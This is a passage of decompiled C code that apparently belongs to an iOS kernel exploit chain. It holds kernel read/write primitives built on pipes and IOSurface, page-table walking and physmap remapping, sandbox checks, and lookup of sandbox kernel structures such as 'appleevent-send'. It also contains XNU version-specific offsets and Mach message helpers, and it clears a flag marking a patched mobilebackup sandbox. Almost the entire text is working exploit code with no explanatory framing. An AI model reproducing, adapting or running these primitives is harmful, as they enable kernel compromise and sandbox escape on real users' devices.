      krw_ctx_clr_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED);
      return 1;
    }
  }
  return result;
}

//----- (0000000000023F78) ----------------------------------------------------
__int64 __fastcall run_callback_with_physmap_write(struct_krwCtx *krwCtx, void (__fastcall *a2)(__int64), __int64 a3)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 result; // x0
  __int64 v7; // x20
  mach_vm_address_t v8; // x23

  result = 0;
  if ( krwCtx )
  {
    krwCtx = krwCtx;
    if ( a2 )
    {
      result = necp_set_opt_string_6(krwCtx, mach_task_self_);
      if ( (uint32_t)result )
      {
        v7 = krwCtx->gap_0x3A8;
        if ( !v7 )
        {
          a2(a3);
          return 1;
        }
        v8 = krwCtx->gap_0x18F0 + (unsigned int)((krwCtx->gap_0x37C_size4 + 1) * krwCtx->stride_0x168);
        if ( krwCtx->krw_pipe_0 == -1
          || krwCtx->krw_pipe_1 == -1
          || krwCtx->iosurfaceFd_size4 == -1
          || !krwCtx->gap_0x218
          || krwCtx->gap_0xC )
        {
          result = kwrite64(
                     krwCtx,
                     krwCtx->gap_0x18F0 + (unsigned int)((krwCtx->gap_0x37C_size4 + 1) * krwCtx->stride_0x168),
                     0);
          if ( !(uint32_t)result )
            return result;
          goto LABEL_11;
        }
        result = pgtable_walk_and_physmap_remap(
                   krwCtx,
                   krwCtx->gap_0x18F0 + (unsigned int)((krwCtx->gap_0x37C_size4 + 1) * krwCtx->stride_0x168),
                   0);
        if ( (uint32_t)result )
        {
LABEL_11:
          a2(a3);
          if ( krwCtx->krw_pipe_0 == -1
            || krwCtx->krw_pipe_1 == -1
            || krwCtx->iosurfaceFd_size4 == -1
            || !krwCtx->gap_0x218
            || krwCtx->gap_0xC )
          {
            result = kwrite64(krwCtx, v8, v7);
            if ( !(uint32_t)result )
              return result;
          }
          else
          {
            result = pgtable_walk_and_physmap_remap(krwCtx, v8, v7);
            if ( !(uint32_t)result )
              return result;
          }
          return 1;
        }
      }
    }
  }
  return result;
}

//----- (00000000000240CC) ----------------------------------------------------
__int64 __fastcall check_sandboxed(int a1)
{
  __int64 result; // x0
  int v3; // w0
  bool v4; // zf
  int v5; // w0

  result = sandbox_check(getpid(), 0, 0);
  if ( (uint32_t)result )
  {
    if ( (unsigned int)sandbox_check(getpid(), "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2, "com.apple.system.notification_center") )
      return 0;
    v3 = sandbox_check(getpid(), "mach-lookup", SANDBOX_CHECK_NO_REPORT | 2, "com.apple.lsd.mapdb");
    v4 = v3 == 0;
    result = v3 != 0;
    v4 = v4 || a1 == 0;
    if ( !v4 )
    {
      result = sandbox_check(getpid(), "syscall-unix", SANDBOX_CHECK_NO_REPORT, 0x61);
      if ( (uint32_t)result != 1 )
      {
        v5 = socket(2, 2, 0);
        if ( v5 != -1 )
        {
          close(v5);
          return 0;
        }
        return 1;
      }
    }
  }
  return result;
}

//----- (00000000000241BC) ----------------------------------------------------
__int64 __fastcall another_sandbox_check(__int64 a1)
{
  int v2; // w8
  __int64 result; // x0

  v2 = sandbox_check(getpid(), 0, 0);
  if ( !v2 || (result = 0, v2 == 1) )
  {
    *(uint8_t *)(a1 + 10) = v2;
    return 1;
  }
  return result;
}

//----- (0000000000024208) ----------------------------------------------------
unsigned __int64 __fastcall find_appleevent_kaddr(struct_krwCtx *krwCtx)
{
  // struct_krwCtx *krwCtx; // x19
  unsigned __int64 result; // x0
  __int64 v3; // x8
  int has_flag; // w0
  __int64 v5; // x8
  __int64 v6; // x20
  __int64 v7; // x21
  unsigned __int64 v8; // x21
  int v9; // w8
  __int64 v10; // x1
  unsigned int v11; // w0
  __int64 v12; // x8
  __int64 v13[3]; // [xsp+0h] [xbp-50h] BYREF
  __int128 v14; // [xsp+18h] [xbp-38h] BYREF

  result = krwCtx->gap_0x5C0;
  if ( result )
    return result;
  v3 = krwCtx->mappedKernelRegion;
  if ( v3 )
  {
    if ( krwCtx->mappedKernelSize )
    {
      result = *(uint64_t *)(v3 + 304);
      if ( result )
      {
LABEL_6:
        krwCtx->gap_0x5C0 = result;
        return result;
      }
    }
  }
  has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_HAS_AUXKC_INFO);
  v5 = 6648;
  if ( !has_flag )
    v5 = 7448;
  v6 = has_flag ? (uint64_t)krwCtx->kernelMachoCtx : krwCtx->sandboxMachoCtx;
  if ( !v6 )
    return 0;
  macho_getsectbyname("__TEXT", v6, "__cstring", &v14);
  result = search_binary_pattern_text(&v14, "appleevent-send", 0, 1);
  if ( result )
  {
    v7 = result;
    macho_getsectbyname("__DATA_CONST", v6, "__const", v13);
    result = find_pattern_kernel_section(v13, v7, *(unsigned __int8 *)(v6 + 52));
    if ( result )
    {
      v8 = result;
      v9 = krwCtx->xnuMajorVersion;
      if ( v9 < 7195 )
      {
        if ( v9 < 6153 )
        {
          v11 = get_const_8();
          v10 = macho_read_u64_thunk(v6, v8 - 2LL * v11);
        }
        else
        {
          v10 = result - 128;
        }
      }
      else
      {
        v10 = result - 184;
      }
      result = validate_kaddr_range(krwCtx, v10);
      if ( result )
      {
        v12 = krwCtx->mappedKernelRegion;
        if ( v12 )
        {
          if ( krwCtx->mappedKernelSize )
            *(uint64_t *)(v12 + 304) = result;
        }
        goto LABEL_6;
      }
    }
  }
  return result;
}
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (0000000000024368) ----------------------------------------------------
void *__fastcall parse_necp_opt_struct(struct_krwCtx *krwCtx, __int16 *a2, __int64 a3)
{
  int v3; // w8
  __int64 v7; // x23
  unsigned __int64 v8; // x26
  unsigned __int64 v9; // x8
  unsigned __int64 v10; // x25
  void *result; // x0
  int v12; // w8
  int v13; // w9
  __int64 v14; // x22
  void *v15; // x21
  int v16; // w24
  char *v17; // x25
  int v18; // w26
  unsigned int v19; // w4
  int v20; // w0
  int v21; // w23
  unsigned int v22; // [xsp+Ch] [xbp-44h] BYREF

  v3 = krwCtx->xnuMajorVersion;
  if ( v3 != 7195 && v3 != 6153 )
    return 0;
  if ( (unsigned int)a3 < 0xC )
    return 0;
  if ( *a2 < 0 )
    return 0;
  v7 = 2LL * *((unsigned __int8 *)a2 + 5);
  v8 = *((unsigned __int8 *)a2 + 10) + (unsigned __int64)(unsigned __int16)a2[4] + *((unsigned __int8 *)a2 + 11);
  v9 = v7 + 2 * v8;
  v10 = v9 + 12;
  if ( (int)v9 + 12 > (unsigned int)a3 )
    return 0;
  v12 = v10 + 2 * *((unsigned __int8 *)a2 + 4);
  v13 = 8 - (v12 & 6);
  if ( (v12 & 6) == 0 )
    v13 = 0;
  v14 = (unsigned int)(v13 + v12);
  v22 = v13 + v12;
  result = calloc((unsigned int)(8 * a3), 1u);
  if ( result )
  {
    v15 = result;
    if ( (unsigned int)v10 < (unsigned int)v14 )
    {
      v16 = 0;
      v17 = (char *)a2 + v10;
      v18 = 2 * v8 + v7 + 12;
      while ( *(uint16_t *)&v17[v16] )
      {
        v19 = v14 + 8 * *(unsigned __int16 *)&v17[v16];
        if ( v19 < v18 + v16 )
        {
          v21 = -2;
          goto LABEL_21;
        }
        v20 = mark_necp_option_visited((__int64)a2, a3, (__int64)v15, v14, v19, &v22);
        if ( v20 )
        {
          v21 = v20;
          goto LABEL_21;
        }
        v16 += 2;
        if ( v18 + v16 >= v22 )
          break;
      }
    }
    v21 = 0;
LABEL_21:
    free(v15);
    return (void *)(v21 == 0);
  }
  return result;
}

//----- (00000000000244C8) ----------------------------------------------------
__int64 __fastcall mark_necp_option_visited(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, unsigned int *a6)
{
  __int64 result; // x0
  unsigned __int64 v8; // x8
  __int64 v13; // x24
  __int16 v14; // w8

  if ( a5 + 8 > (unsigned int)a2 )
    return 0xFFFFFFFFLL;
  v8 = (unsigned __int64)a5 >> 3;
  if ( *(uint8_t *)(a3 + v8) )
    return 0;
  *(uint8_t *)(a3 + v8) = 1;
  if ( *a6 > a5 )
    *a6 = a5;
  v13 = a1 + a5;
  if ( *(uint8_t *)v13 == 1 )
  {
    v14 = *(uint16_t *)(v13 + 1);
    if ( (v14 & 1) != 0 )
      *(uint16_t *)(v13 + 1) = v14 & 0xFFFA;
    return 0;
  }
  result = mark_necp_option_visited(a1, a2, a3, a4, (unsigned int)a4 + 8 * *(unsigned __int16 *)(v13 + 4), a6);
  if ( !(uint32_t)result )
  {
    result = mark_necp_option_visited(a1, a2, a3, a4, (unsigned int)a4 + 8 * *(unsigned __int16 *)(v13 + 6), a6);
    if ( !(uint32_t)result )
      return 0;
  }
  return result;
}

//----- (00000000000245BC) ----------------------------------------------------
__int64 __fastcall get_kext_base_addr(struct_krwCtx *krwCtx, char *__s, uint64_t *a3)
{
  size_t v6; // x0
  __int64 result; // x0
  __int64 v8; // [xsp+8h] [xbp-28h] BYREF

  v6 = strlen(__s);
  result = find_macho_entry_by_name(krwCtx, __s, v6 + 1, &v8);
  if ( (uint32_t)result )
  {
    *a3 = v8;
    return 1;
  }
  return result;
}

//----- (0000000000024620) ----------------------------------------------------
__int64 __fastcall find_macho_entry_by_name(struct_krwCtx *krwCtx, char *__s2, unsigned __int64 a3, __int64 *a4)
{
  // struct_krwCtx *krwCtx; // x19
  size_t v5; // x21
  __int64 v8; // x0
  __int64 v9; // x0
  char *v10; // x23
  unsigned int v11; // w8
  __int64 v12; // x24
  const char *i; // x22
  __int64 v14; // x8
  __int64 v15; // x23
  __int64 v16; // x0
  __int64 v17; // x8
  __int64 v18; // x24
  char *v19; // x0
  __int64 v20; // x25
  __int64 v21; // x26
  __int128 *v22; // x27
  __int128 v23; // q1
  __int128 v24; // q1
  unsigned int v26; // [xsp+4h] [xbp-ACh] BYREF
  __int64 v27; // [xsp+8h] [xbp-A8h] BYREF
  __int64 v28; // [xsp+10h] [xbp-A0h] BYREF
  __int128 v29[3]; // [xsp+18h] [xbp-98h] BYREF
  __int128 v30; // [xsp+48h] [xbp-68h]

  v5 = a3;
  v8 = krwCtx->auxkcMachoCtx;
  if ( v8 )
  {
    v9 = macho_find_loadcmd_by_name(v8, __s2, a3);
    if ( v9 )
    {
      *a4 = v9;
      return 1;
    }
  }
  v10 = (char *)krwCtx->puafPagesBuf;
  if ( v10 )
  {
    v11 = krwCtx->gap_0x1D08_size4;
LABEL_6:
    if ( v5 >= 0x40 )
      v5 = 64;
    if ( v11 )
    {
      v12 = v11;
      for ( i = v10 + 8; strncmp(__s2, i, v5); i += 72 )
      {
        if ( !--v12 )
          return 0;
      }
      *a4 = *((uint64_t *)i - 1);
      return 1;
    }
    return 0;
  }
  v14 = krwCtx->mappedKernelRegion;
  if ( !v14 || !krwCtx->mappedKernelSize || (v15 = *(uint64_t *)(v14 + 264)) == 0 )
  {
    v16 = find_kernel_func_by_scan(krwCtx->kernelMachoCtx);
    if ( !v16 )
      return 0;
    v15 = v16;
    if ( !validate_kaddr_range(krwCtx, v16) )
      return 0;
    v17 = krwCtx->mappedKernelRegion;
    if ( v17 && krwCtx->mappedKernelSize )
      *(uint64_t *)(v17 + 264) = v15;
  }
  if ( kread_u32(krwCtx, v15 + 20, &v26)
    && v26 <= 0x400
    && kread_physmap_decorated(krwCtx, v15 + 32, (unsigned __int64 *)&v27) )
  {
    if ( validate_kaddr_range(krwCtx, v27) )
    {
      v18 = v26;
      v19 = (char *)calloc(72LL * v26, 1u);
      if ( v19 )
      {
        v10 = v19;
        if ( (uint32_t)v18 )
        {
          v20 = 0;
          v21 = v27;
          v22 = v19 + 8;
          while ( kread_physmap_decorated(
                  krwCtx,
                    v21 + (unsigned int)(krwCtx->stride_0x168 * v20),
                    (unsigned __int64 *)&v28) )
          {
            if ( !validate_kaddr_range(krwCtx, v28) )
              break;
            if ( !kread_physmap_decorated(krwCtx, v28 + 80, (unsigned __int64 *)&v28) )
              break;
            if ( !(unsigned int)krw_read_thunk(krwCtx, v28 + 16, 64, v29) )
              break;
            HIBYTE(v30) = 0;
            v23 = v29[1];
            *v22 = v29[0];
            v22[1] = v23;
            v24 = v30;
            v22[2] = v29[2];
            v22[3] = v24;
            if ( !kread_physmap_decorated(krwCtx, v28 + 156, (unsigned __int64 *)&v28) )
              break;
            *((uint64_t *)v22 - 1) = v28;
            ++v20;
            v22 = (__int128 *)((char *)v22 + 72);
            if ( v18 == v20 )
            {
              v11 = v26;
              goto LABEL_40;
            }
          }
          free(v10);
          return 0;
        }
        v11 = 0;
LABEL_40:
        krwCtx->puafPagesBuf = (uint64_t)v10;
        krwCtx->gap_0x1D08_size4 = v11;
        goto LABEL_6;
      }
    }
  }
  return 0;
}

//----- (00000000000248A4) ----------------------------------------------------
__int64 __fastcall find_macho_entry_by_name_wrap(struct_krwCtx *krwCtx, char *a2, unsigned __int64 a3, uint64_t *a4)
{
  __int64 result; // x0
  __int64 v6; // [xsp+8h] [xbp-18h] BYREF

  result = find_macho_entry_by_name(krwCtx, a2, a3, &v6);
  if ( (uint32_t)result )
  {
    *a4 = v6;
    return 1;
  }
  return result;
}

//----- (00000000000248E4) ----------------------------------------------------
__int64 __fastcall init_krw_ctx_fields(__int64 a1)
{
  __int64 result; // x0

  if ( !a1 )
    return 708609LL;
  result = 0LL;
  *(uint64_t *)a1 = 0LL;
  *(uint64_t *)(a1 + 8) = 0LL;
  *(uint32_t *)(a1 + 16) = 0;
  return result;
}

//----- (0000000000024908) ----------------------------------------------------
__int64 __fastcall free_krw_ctx_flags(__int64 a1)
{
  void *v2; // x0
  __int64 result; // x0

  if ( !a1 )
    return 708609;
  v2 = *(void **)a1;
  if ( v2 )
    free(v2);
  result = 0;
  *(uint64_t *)a1 = 0;
  *(uint64_t *)(a1 + 8) = 0;
  *(uint32_t *)(a1 + 16) = 0;
  return result;
}

//----- (0000000000024954) ----------------------------------------------------
double __fastcall krw_ctx_buf_append_typed_val(__int64 a1, int a2)
{
  double result; // d0
  __int64 v5; // x8

  if ( !(unsigned int)buf_ensure_capacity(a1, 0xCu) )
  {
    v5 = *(unsigned int *)(a1 + 8) + *(uint64_t *)a1;
    *(uint32_t *)v5 = a2;
    result = 2.64227521e-308;
    *(uint64_t *)(v5 + 4) = 0x13000000000000LL;
    *(uint32_t *)(a1 + 8) += 12;
    ++*(uint32_t *)(a1 + 16);
  }
  return result;
}

//----- (00000000000249B8) ----------------------------------------------------
__int64 __fastcall buf_ensure_capacity(__int64 a1, unsigned int a2)
{
  int v2; // w8
  int v3; // w9
  __int64 v4; // x19
  unsigned int v6; // w21
  void *v7; // x0
  int v8; // w8

  v2 = *(uint32_t *)(a1 + 8);
  v3 = *(uint32_t *)(a1 + 12);
  if ( v3 - v2 >= a2 )
    return 0;
  v4 = 708617;
  if ( a2 <= 0xFFFFFBFF )
  {
    if ( v3 )
    {
      v6 = a2 + 1024;
      v7 = realloc(*(void **)a1, v2 + a2 + 1024);
      if ( !v7 )
        return v4;
    }
    else
    {
      v6 = a2 + 1052;
      v7 = calloc(a2 + 1052, 1u);
      if ( !v7 )
        return v4;
    }
    *(uint64_t *)a1 = v7;
    v8 = *(uint32_t *)(a1 + 8);
    *(uint32_t *)(a1 + 12) = v8 + v6;
    if ( !v8 )
    {
      v4 = 0;
      *(uint32_t *)(a1 + 8) = 28;
      return v4;
    }
    return 0;
  }
  return 708620;
}

//----- (0000000000024A64) ----------------------------------------------------
__int64 __fastcall krw_ctx_buf_append_entry(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // x0
  __int64 v7; // x8

  result = buf_ensure_capacity(a1, 0x10u);
  if ( !(uint32_t)result )
  {
    v7 = *(unsigned int *)(a1 + 8) + *(uint64_t *)a1;
    *(uint64_t *)v7 = a2;
    *(uint32_t *)(v7 + 8) = 34799616;
    *(uint32_t *)(v7 + 12) = a3;
    *(uint32_t *)(a1 + 8) += 16;
    ++*(uint32_t *)(a1 + 16);
  }
  return result;
}

//----- (0000000000024AD0) ----------------------------------------------------
__int64 __fastcall buf_append_data(__int64 a1, const void *a2, unsigned int a3)
{
  __int64 v6; // x21

  v6 = buf_ensure_capacity(a1, a3);
  if ( !(uint32_t)v6 )
  {
    memcpy((void *)(*(unsigned int *)(a1 + 8) + *(uint64_t *)a1), a2, a3);
    *(uint32_t *)(a1 + 8) += a3;
  }
  return v6;
}

//----- (0000000000024B38) ----------------------------------------------------
__int64 __fastcall send_mach_msg_from_ctx(__int64 a1, mach_port_t a2, mach_port_t a3, mach_msg_id_t a4)
{
  __int64 result; // x0
  mach_msg_header_t *v6; // x10
  mach_msg_bits_t v7; // w11
  int v8; // w9
  mach_msg_size_t v9; // w9
  mach_msg_return_t v10; // w0

  result = 708609;
  if ( a1 )
  {
    v6 = *(mach_msg_header_t **)a1;
    if ( *(uint64_t *)a1 )
    {
      v7 = *(uint32_t *)(a1 + 16);
      if ( v7 )
        v8 = -2147478252;
      else
        v8 = 5396;
      v6->msgh_bits = v8;
      v9 = *(uint32_t *)(a1 + 8);
      v6->msgh_size = v9;
      v6->msgh_remote_port = a3;
      v6->msgh_local_port = a2;
      v6->msgh_voucher_port = 0;
      v6->msgh_id = a4;
      v6[1].msgh_bits = v7;
      v10 = mach_msg(*(mach_msg_header_t **)a1, 262145, v9, 0, 0, 0, 0);
      if ( v10 )
        return v10 | 0x80000000;
      else
        return 0;
    }
  }
  return result;
}

//----- (0000000000024BC0) ----------------------------------------------------
int __fastcall parse_xnu_version_string(__int64 a1)
{
  struct xnu_runtime_info *info; // x20
  char *v2; // x0
  char *v3; // x0
  int result; // w0
  __int64 v5; // x8
  unsigned __int64 v6; // x22
  int v7; // w8
  int v8; // w8
  int ignored_component1; // [xsp+30h] [xbp-560h] BYREF
  int ignored_component2; // [xsp+34h] [xbp-55Ch] BYREF
  int xnu_parts[4]; // [xsp+38h] [xbp-558h] BYREF
  struct utsname v13; // [xsp+48h] [xbp-548h] BYREF

  info = (struct xnu_runtime_info *)a1;
  uname(&v13);
  info->versionString = strdup(v13.version);
  memset(xnu_parts, 0, sizeof(xnu_parts));
  v2 = strstr(v13.version, "xnu-");
  if ( sscanf(v2, "xnu-%d.%d.%d~%d", &xnu_parts[0], &xnu_parts[1], &xnu_parts[2], &xnu_parts[3]) == 4
    || (v3 = strstr(v13.version, "xnu-"),
        sscanf(
          v3,
          "xnu-%d.%d.%d.%d.%d~%d",
          &xnu_parts[0],
          &xnu_parts[1],
          &xnu_parts[2],
          &ignored_component1,
          &ignored_component2,
          &xnu_parts[3]) == 6) )
  {
    v5 = 0;
    v6 = 0;
    do
    {
      v6 = xnu_parts[v5 / 4] + 1000 * v6;
      v5 += 4;
    }
    while ( v5 != 16 );
    info->packedVersion = v6;
    info->socDependentOffset = 38;
    if ( strstr(v13.version, "T8120") )
      v7 = 46;
    else
      v7 = 38;
    info->socDependentOffset = v7;
    if ( v6 <= 0x74B4D4047FFLL )
    {
      if ( v6 < 0x73835AB9470LL )
        v8 = 104;
      else
        v8 = 88;
    }
    else
    {
      v8 = 72;
    }
    info->versionDependentOffset = v8;
    memcpy(info->defaultOffsets, kXnuRuntimeDefaultOffsets, sizeof(info->defaultOffsets));
    result = 0;
  }
  else
  {
    result = 1;
  }
  return result;
}

//----- (0000000000024D64) ----------------------------------------------------
const CFDictionaryRef *__fastcall ioservice_get_matching(const char *a1)
{
  const CFDictionaryRef *result; // x0

  result = IOServiceMatching(a1);
  if ( result )
  {
    return (const CFDictionaryRef *)IOServiceGetMatchingService(kIOMasterPortDefault, result);
  }
  return result;
}
// 24D90: variable 'vars8' is possibly undefined

//----- (0000000000024DA8) ----------------------------------------------------
__int64 __fastcall ioservice_notification_send(
        unsigned int a1,
        __int64 a2,
        __int64 a3,
        unsigned int a4,
        unsigned int a5,
        const void *a6,
        int a7)
{
  mach_port_t reply_port; // w0
  mach_port_t v14; // w21
  __int64 v15; // x0
  int v16; // w8
  int v17; // w9
  int v18; // w23
  uint32_t *v19; // x8
  mach_port_t msgh_remote_port; // w10
  mach_msg_size_t msgh_size; // w8
  char v22; // w9
  uint64_t msgStorage[0x110 / sizeof(uint64_t)]; // [xsp+0h] [xbp-170h] BYREF
  mach_msg_header_t *msg; // x24

  memset(msgStorage, 0, sizeof(msgStorage));
  msg = (mach_msg_header_t *)msgStorage;
  reply_port = mig_get_reply_port();
  if ( reply_port )
  {
    v14 = reply_port;
    msg[0].msgh_bits = -2147478253;
    *(uint64_t *)&msg[0].msgh_remote_port = __PAIR64__(reply_port, a1);
    *(uint64_t *)&msg[0].msgh_id = 0x200000B36LL;
    *(uint64_t *)&msg[1].msgh_size = a3;
    msg[1].msgh_local_port = 0x1000000;
    *(uint64_t *)&msg[1].msgh_voucher_port = __PAIR64__(a5, a4);
    *(uint32_t *)((char *)msgStorage + 0x34) = 1310720;
    *(NDR_record_t *)((char *)msgStorage + 0x38) = NDR_record;
    v15 = __strlcpy_chk((char *)msgStorage + 0x48, (const char *)a2, 0x80u, 0x80u);
    v16 = v15 + 1;
    v17 = 8 - ((v15 + 1) & 7);
    if ( ((v15 + 1) & 7) == 0 )
      v17 = 0;
    v18 = v17 + v16;
    *(uint32_t *)((char *)msgStorage + 0x44) = v17 + v16;
    v19 = (mach_msg_bits_t *)((char *)msgStorage + (unsigned int)(v17 + v16));
    v19[18] = a4;
    v19[19] = a7;
    memcpy(v19 + 20, a6, (unsigned int)(8 * a7));
    if ( mach_msg(msg, 3, v18 + 8 * a7 + 80, 0x110u, v14, 0, 0) )
    {
      mig_dealloc_reply_port(v14);
      msgh_remote_port = 0;
      msgh_size = 0;
      v22 = 0;
    }
    else if ( msg[0].msgh_id == 2970 )
    {
      if ( (msg[0].msgh_bits & 0x80000000) != 0 && msg[1].msgh_bits == 1 )
      {
        msgh_remote_port = 0;
        v22 = 1;
        msgh_size = msg[1].msgh_size;
      }
      else
      {
        msgh_size = 0;
        v22 = 1;
        msgh_remote_port = msg[1].msgh_remote_port;
      }
    }
    else
    {
      msgh_size = 0;
      v22 = 1;
      msgh_remote_port = -301;
    }
  }
  else
  {
    msgh_remote_port = 0;
    msgh_size = 0;
    v22 = 1;
  }
  if ( ((unsigned __int8)v22 & (msgh_remote_port == 0) & (msgh_size != 0) & (msgh_size != -1)) != 0 )
    return msgh_size;
  else
    return 0;
}

//----- (0000000000024FC0) ----------------------------------------------------
__int64 __fastcall register_ioservice_publish_notify(__int64 a1, unsigned int a2, mach_port_name_t *a3)
{
  host_t v6; // w0
  __int64 result; // x0
  mach_port_name_t name; // [xsp+8h] [xbp-28h] BYREF
  io_master_t io_master; // [xsp+Ch] [xbp-24h] BYREF

  v6 = mach_host_self();
  if ( !host_get_io_master(v6, &io_master) && !mach_port_allocate(mach_task_self_, 1u, &name) )
  {
    result = ioservice_notification_send(io_master, (__int64)"IOServicePublish", a1, a2, name, 0, 0);
    if ( (uint32_t)result )
    {
      *a3 = name;
      return result;
    }
    mach_port_destroy(mach_task_self_, name);
  }
  return 0;
}

//----- (0000000000025068) ----------------------------------------------------
bool __fastcall set_thread_realtime_policy_1(thread_act_t a1, thread_policy_t policy_info)
{
  return !thread_policy_set(a1, 2u, policy_info, 4u) && thread_policy_set(a1, 3u, policy_info + 4, 1u) == 0;
}

//----- (00000000000250C4) ----------------------------------------------------
bool __fastcall set_thread_abs_realtime(thread_act_t a1, unsigned int a2)
{
  unsigned __int64 v4; // d0
  unsigned __int64 v5; // d1
  double v7; // d0
  struct mach_timebase_info v8; // [xsp+0h] [xbp-30h] BYREF
  integer_t policy_info[3]; // [xsp+8h] [xbp-28h] BYREF
  __int64 v10; // [xsp+14h] [xbp-1Ch]

  if ( mach_timebase_info(&v8) )
    return 0;
  LODWORD(v5) = v8.numer;
  LODWORD(v4) = v8.denom;
  v7 = (double)v4 / (double)v5 * 1000000.0;
  policy_info[0] = (unsigned int)(v7 * (double)a2);
  policy_info[1] = (unsigned int)(v7 * 50.0);
  policy_info[2] = policy_info[0];
  v10 = 0x7F00000000LL;
  return set_thread_realtime_policy_1(a1, policy_info);
}
// 250F8: variable 'v4' is possibly undefined
// 250FC: variable 'v5' is possibly undefined

//----- (000000000002515C) ----------------------------------------------------
bool __fastcall set_thread_abs_realtime_50(thread_act_t a1)
{
  return set_thread_abs_realtime(a1, 0x32u);
}

//----- (0000000000025164) ----------------------------------------------------
__int64 __fastcall release_write_semaphore_lock(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v4; // x9

  result = 708616;
  v4 = krwCtx->mappedKernelRegion;
  if ( v4 && krwCtx->mappedKernelSize )
  {
    if ( a2 > 0x3F )
    {
      return 163857;
    }
    else
    {
      result = 0;
      atomic_store(0, (unsigned __int8 *)(v4 + a2));
    }
  }
  return result;
}

//----- (00000000000251A4) ----------------------------------------------------
__int64 __fastcall acquire_write_semaphore_lock(struct_krwCtx *krwCtx, unsigned int a2, unsigned int a3)
{
  __int64 v3; // x19
  __int64 v4; // x25
  uint64_t v8; // x0
  uint64_t v9; // x22
  atomic_uchar *v10; // x25

  v3 = 708616;
  v4 = krwCtx->mappedKernelRegion;
  if ( v4 && krwCtx->mappedKernelSize )
  {
    if ( a2 > 0x3F )
    {
      return 163857;
    }
    else
    {
      v8 = mach_absolute_time();
      if ( (atomic_exchange((atomic_uchar *volatile)(v4 + a2), 1u) & 1) != 0 )
      {
        v9 = v8;
        v10 = (atomic_uchar *)(v4 + a2);
        while ( !a3
             || a3 >= (mach_absolute_time() - v9) * krwCtx->timebase.numer / krwCtx->timebase.denom / 0xF4240 )
        {
          thread_switch(0, 2, 1u);
          if ( (atomic_exchange(v10, 1u) & 1) == 0 )
            return 0;
        }
        return 708640;
      }
      else
      {
        return 0;
      }
    }
  }
  return v3;
}

//----- (0000000000025294) ----------------------------------------------------
__int64 __fastcall fd_close(int a1)
{
  __int64 result; // x0
  int v2; // w19
  int v3; // w8

  result = close(a1);
  if ( (uint32_t)result )
  {
    v2 = errno;
    v3 = errno;
    if ( v2 < 0 )
      v3 = -v3;
    return v3 | 0x40000000u;
  }
  return result;
}

//----- (00000000000252D4) ----------------------------------------------------
__int64 __fastcall fd_open_dev_null(int *fdOut)
{
  int fd; // w0
  int fd_; // w8
  __int64 result; // x0
  int v5; // w19
  int v6; // w8

  fd = open("/dev/null", 0x20);
  if ( fd < 0 )
  {
    v5 = errno;
    v6 = errno;
    if ( v5 < 0 )
      v6 = -v6;
    return v6 | 0x40000000u;
  }
  else
  {
    fd_ = fd;
    result = 0;
    *fdOut = fd_;
  }
  return result;
}

//----- (0000000000025334) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_simple(struct_krwCtx *krwCtx, unsigned __int64 a2, void *a3, unsigned int a4, int a5)
{
  __int64 v5; // x20
  __int64 v11; // x26
  uint64_t v13[3]; // [xsp+8h] [xbp-78h] BYREF
  __int64 v14; // [xsp+20h] [xbp-60h] BYREF
  __int64 v15; // [xsp+28h] [xbp-58h]
  unsigned __int64 v16; // [xsp+30h] [xbp-50h]
  int v17; // [xsp+3Ch] [xbp-44h] BYREF

  v5 = 708609;
  if ( krwCtx->krw_pipe_0 != -1
    && krwCtx->krw_pipe_1 != -1
    && krwCtx->pipeFd0 != -1
    && krwCtx->pipeFd1 != -1
    && check_kaddr_in_physmap(krwCtx, a2) )
  {
    v17 = -1;
    if ( a5 )
    {
      v11 = fd_open_dev_null(&v17);
      if ( (uint32_t)v11 )
        goto LABEL_15;
      v11 = fd_read_test((int *)krwCtx->krw_pipe_0);
      if ( (uint32_t)v11 )
        goto LABEL_15;
    }
    v14 = a4;
    v15 = 0x1000000000000000LL;
    v16 = a2;
    v11 = fd_write((__int64)krwCtx->krw_pipe_0, &v14, 0x18u);
    if ( !(uint32_t)v11 )
    {
      v11 = fd_read((int *)krwCtx->krw_pipe_0, v13, 0x18u);
      if ( !(uint32_t)v11 )
      {
        if ( (v14 ^ v13[0]) | (v15 ^ v13[1]) | (v16 ^ v13[2]) )
          v11 = 708628;
        else
          v11 = fd_read((int *)&krwCtx->pipeFd0, a3, a4);
      }
    }
    if ( a5 )
LABEL_15:
      fd_close(v17);
    return v11;
  }
  return v5;
}

//----- (0000000000025498) ----------------------------------------------------
__int64 __fastcall pipe_pair_krw(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, unsigned int a4, int a5)
{
  __int64 v5; // x20
  __int64 test; // x26
  uint64_t v13[3]; // [xsp+8h] [xbp-78h] BYREF
  __int128 v14; // [xsp+20h] [xbp-60h] BYREF
  unsigned __int64 v15; // [xsp+30h] [xbp-50h]
  int v16; // [xsp+3Ch] [xbp-44h] BYREF

  v5 = 708609;
  if ( krwCtx->krw_pipe_0 != -1
    && krwCtx->krw_pipe_1 != -1
    && krwCtx->pipeFd0 != -1
    && krwCtx->pipeFd1 != -1
    && check_kaddr_in_physmap(krwCtx, a2) )
  {
    v16 = -1;
    if ( a5 )
    {
      test = fd_open_dev_null(&v16);
      if ( (uint32_t)test )
        goto LABEL_15;
      test = fd_read_test((int *)krwCtx->krw_pipe_0);
      if ( (uint32_t)test )
        goto LABEL_15;
    }
    v14 = xmmword_436C0;
    v15 = a2;
    test = fd_write((__int64)krwCtx->krw_pipe_0, &v14, 0x18u);
    if ( !(uint32_t)test )
    {
      test = fd_read((int *)krwCtx->krw_pipe_0, v13, 0x18u);
      if ( !(uint32_t)test )
      {
        if ( ((unsigned __int64)v14 ^ v13[0]) | (*((uint64_t *)&v14 + 1) ^ v13[1]) | (v15 ^ v13[2]) )
          test = 708628;
        else
          test = fd_write((__int64)&krwCtx->pipeFd0, a3, a4);
      }
    }
    if ( a5 )
LABEL_15:
      fd_close(v16);
    return test;
  }
  return v5;
}
// 436C0: using guessed type __int128 xmmword_436C0;

//----- (00000000000255FC) ----------------------------------------------------
